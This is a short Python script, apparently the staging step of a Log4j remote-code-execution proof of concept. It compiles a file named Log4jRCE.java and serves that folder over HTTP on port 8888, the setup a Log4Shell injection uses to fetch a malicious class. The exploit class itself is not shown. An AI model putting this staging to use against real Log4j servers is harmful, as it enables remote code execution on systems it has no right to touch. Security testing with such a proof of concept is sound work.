import subprocess
import os

os.chdir("./poc/")
subprocess.run(["javac", "Log4jRCE.java"])
subprocess.run(["python3", "-m", "http.server", "8888"])
